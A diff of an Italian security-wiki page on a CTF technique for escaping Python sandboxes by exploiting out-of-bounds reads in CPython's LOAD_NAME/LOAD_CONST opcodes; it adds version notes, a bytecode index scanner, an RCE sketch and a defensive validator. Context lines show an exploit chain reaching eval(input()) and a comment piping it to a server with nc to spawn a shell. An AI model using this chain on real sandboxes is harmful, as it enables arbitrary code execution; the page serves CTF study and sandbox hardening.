@@ -6,7 +6,7 @@
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Possiamo utilizzare la funzione di lettura OOB nell'opcode LOAD_NAME / LOAD_CONST per ottenere un simbolo nella memoria. Ciò significa utilizzare un trucco come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come il nome di una funzione) che desideri.
+Possiamo utilizzare la funzionalità OOB read nell'opcode LOAD_NAME / LOAD_CONST per ottenere alcuni simboli nella memoria. Ciò significa utilizzare trucchi come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come il nome di una funzione) che desideri.
 
 Poi basta creare il tuo exploit.
 
@@ -23,9 +23,9 @@ Puoi inserire codice Python arbitrario, e verrà compilato in un [oggetto codice
 
 In questo modo, tutte le espressioni che contengono costanti (ad es. numeri, stringhe, ecc.) o nomi (ad es. variabili, funzioni) potrebbero causare un errore di segmentazione alla fine.
 
-### Lettura Fuori Limite <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-Come si verifica l'errore di segmentazione?
+Come avviene l'errore di segmentazione?
 
 Iniziamo con un semplice esempio, `[a, b, c]` potrebbe essere compilato nel seguente bytecode.
 ```
@@ -35,7 +35,7 @@ Iniziamo con un semplice esempio, `[a, b, c]` potrebbe essere compilato nel segu
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Ma cosa succede se il `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria da cui dovrebbe originariamente essere. Sì, questa è una "caratteristica" di lettura fuori limite.
+Ma cosa succede se i `co_names` diventano una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria da cui dovrebbe originariamente essere. Sì, questa è una "caratteristica" di lettura fuori limite.
 
 Il concetto fondamentale per la soluzione è semplice. Alcuni opcodes in CPython, ad esempio `LOAD_NAME` e `LOAD_CONST`, sono vulnerabili (?) a letture OOB.
 
@@ -49,7 +49,7 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-In questo modo possiamo utilizzare la funzione OOB per ottenere un "nome" da un offset di memoria arbitrario. Per assicurarci di quale nome si tratta e qual è il suo offset, continua a provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa in circa oparg > 700. Puoi anche provare a usare gdb per dare un'occhiata alla disposizione della memoria, ovviamente, ma non credo che sarebbe più facile?
+In questo modo possiamo utilizzare la funzione OOB per ottenere un "nome" da un offset di memoria arbitrario. Per assicurarci di quale nome si tratta e qual è il suo offset, continua a provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa in circa oparg > 700. Puoi anche provare a usare gdb per dare un'occhiata alla disposizione della memoria, ma non credo che sarebbe più facile?
 
 ### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
@@ -205,7 +205,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Fondamentalmente fa le seguenti cose, per quelle stringhe le otteniamo dal metodo `__dir__`:
+Fa fondamentalmente le seguenti cose, per quelle stringhe le otteniamo dal metodo `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -218,4 +218,117 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+---
+
+### Note sulla versione e opcodes interessati (Python 3.11–3.13)
+
+- Gli opcodes del bytecode CPython indicizzano ancora le tuple `co_consts` e `co_names` tramite operandi interi. Se un attaccante riesce a forzare queste tuple a essere vuote (o più piccole dell'indice massimo utilizzato dal bytecode), l'interprete leggerà la memoria fuori dai limiti per quell'indice, restituendo un puntatore PyObject arbitrario dalla memoria vicina. Gli opcodes rilevanti includono almeno:
+- `LOAD_CONST consti` → legge `co_consts[consti]`.
+- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leggono nomi da `co_names[...]` (per 3.11+ nota che `LOAD_ATTR`/`LOAD_GLOBAL` memorizzano i bit di flag nel bit basso; l'indice effettivo è `namei >> 1`). Vedi la documentazione del disassemblatore per la semantica esatta per versione. [Python dis docs].
+- Python 3.11+ ha introdotto cache adattive/in-line che aggiungono voci `CACHE` nascoste tra le istruzioni. Questo non cambia il primitivo OOB; significa solo che se crei manualmente bytecode, devi tenere conto di quelle voci di cache quando costruisci `co_code`.
+
+Implicazione pratica: la tecnica in questa pagina continua a funzionare su CPython 3.11, 3.12 e 3.13 quando puoi controllare un oggetto di codice (ad es., tramite `CodeType.replace(...)`) e ridurre `co_consts`/`co_names`.
+
+### Scanner rapido per indici OOB utili (compatibile 3.11+/3.12+)
+
+Se preferisci sondare oggetti interessanti direttamente dal bytecode piuttosto che da sorgente di alto livello, puoi generare oggetti di codice minimi e forzare gli indici. L'aiutante qui sotto inserisce automaticamente cache in-line quando necessario.
+```python
+import dis, types
+
+def assemble(ops):
+# ops: list of (opname, arg) pairs
+cache = bytes([dis.opmap.get("CACHE", 0), 0])
+out = bytearray()
+for op, arg in ops:
+opc = dis.opmap[op]
+out += bytes([opc, arg])
+# Python >=3.11 inserts per-opcode inline cache entries
+ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
+out += cache * ncache
+return bytes(out)
+
+# Reuse an existing function's code layout to simplify CodeType construction
+base = (lambda: None).__code__
+
+# Example: probe co_consts[i] with LOAD_CONST i and return it
+# co_consts/co_names are intentionally empty so LOAD_* goes OOB
+
+def probe_const(i):
+code = assemble([
+("RESUME", 0),          # 3.11+
+("LOAD_CONST", i),
+("RETURN_VALUE", 0),
+])
+c = base.replace(co_code=code, co_consts=(), co_names=())
+try:
+return eval(c)
+except Exception:
+return None
+
+for idx in range(0, 300):
+obj = probe_const(idx)
+if obj is not None:
+print(idx, type(obj), repr(obj)[:80])
+```
+Note
+- Per sondare i nomi invece, sostituisci `LOAD_CONST` con `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e regola di conseguenza l'uso dello stack.
+- Usa `EXTENDED_ARG` o più byte di `arg` per raggiungere indici >255 se necessario. Quando costruisci con `dis` come sopra, controlli solo il byte basso; per indici più grandi, costruisci i byte grezzi tu stesso o dividi l'attacco su più caricamenti.
+
+### Modello RCE minimale solo bytecode (co_consts OOB → builtins → eval/input)
+
+Una volta identificato un indice `co_consts` che si risolve nel modulo builtins, puoi ricostruire `eval(input())` senza alcun `co_names` manipolando lo stack:
+```python
+# Build co_code that:
+# 1) LOAD_CONST <builtins_idx> → push builtins module
+# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
+#    out of objects living nearby in memory (e.g., from method tables),
+# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
+# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
+```
+Questo approccio è utile in sfide che ti danno il controllo diretto su `co_code` mentre forzano `co_consts=()` e `co_names=()` (ad esempio, BCTF 2024 “awpcode”). Evita trucchi a livello di sorgente e mantiene le dimensioni del payload ridotte sfruttando le operazioni sulla pila del bytecode e i costruttori di tuple.
+
+### Controlli difensivi e mitigazioni per sandbox
+
+Se stai scrivendo una “sandbox” Python che compila/evalua codice non affidabile o manipola oggetti di codice, non fare affidamento su CPython per controllare i limiti degli indici delle tuple utilizzati dal bytecode. Invece, valida gli oggetti di codice tu stesso prima di eseguirli.
+
+Validator pratico (rifiuta l'accesso OOB a co_consts/co_names)
+```python
+import dis
+
+def max_name_index(code):
+max_idx = -1
+for ins in dis.get_instructions(code):
+if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
+"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
+namei = ins.arg or 0
+# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
+if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
+namei >>= 1
+max_idx = max(max_idx, namei)
+return max_idx
+
+def max_const_index(code):
+return max([ins.arg for ins in dis.get_instructions(code)
+if ins.opname == "LOAD_CONST"] + [-1])
+
+def validate_code_object(code: type((lambda:0).__code__)):
+if max_const_index(code) >= len(code.co_consts):
+raise ValueError("Bytecode refers to const index beyond co_consts length")
+if max_name_index(code) >= len(code.co_names):
+raise ValueError("Bytecode refers to name index beyond co_names length")
+
+# Example use in a sandbox:
+# src = input(); c = compile(src, '<sandbox>', 'exec')
+# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
+# validate_code_object(c)
+# eval(c, {'__builtins__': {}})
+```
+Idee di mitigazione aggiuntive
+- Non consentire `CodeType.replace(...)` arbitrario su input non attendibili, o aggiungere controlli strutturali rigorosi sull'oggetto codice risultante.
+- Considerare di eseguire codice non attendibile in un processo separato con sandboxing a livello di OS (seccomp, job objects, containers) invece di fare affidamento sulla semantica di CPython.
+
+## Riferimenti
+
+- Il writeup di Splitline per HITCON CTF 2022 “V O I D” (origine di questa tecnica e catena di exploit ad alto livello): https://blog.splitline.tw/hitcon-ctf-2022/
+- Documentazione del disassemblatore Python (semantica degli indici per LOAD_CONST/LOAD_NAME/etc., e flag a basso bit per `LOAD_ATTR`/`LOAD_GLOBAL` in 3.11+): https://docs.python.org/3.13/library/dis.html
 {{#include ../../../banners/hacktricks-training.md}}
